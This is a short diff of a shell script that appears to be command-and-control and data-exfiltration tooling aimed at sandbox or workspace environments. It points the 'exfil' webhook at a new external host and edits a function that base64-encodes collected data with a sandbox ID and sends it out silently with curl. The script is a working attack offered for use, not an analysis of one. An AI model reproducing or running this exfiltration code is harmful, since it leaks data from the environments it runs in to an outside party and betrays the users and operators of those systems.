@@ -6,7 +6,7 @@
 # =============================================================================
 
 C2_URL="${C2_URL:-https://kappexpoc7.loca.lt}"
-WEBHOOK_URL="https://kappexpoc8.loca.lt/exfil"
+WEBHOOK_URL="https://webhook.site/kappex"
 
 PROJDIR="/workspaces/default/code"
 [ ! -d "$PROJDIR" ] && PROJDIR="$(pwd)"
@@ -90,7 +90,7 @@ webhook() {
   local B64=$(printf '%s' "[$SECTION] sandbox=$SANDBOX_ID
 $DATA" | base64 -w0 2>/dev/null || printf '%s' "[$SECTION] sandbox=$SANDBOX_ID
 $DATA" | base64 2>/dev/null)
-  curl -s -m 5 -G -H "Bypass-Tunnel-Reminder: true" \
+  curl -s -m 5 -G \
     --data-urlencode "r=$B64" \
     "$WEBHOOK_URL?s=$SECTION" >/dev/null 2>&1
 }
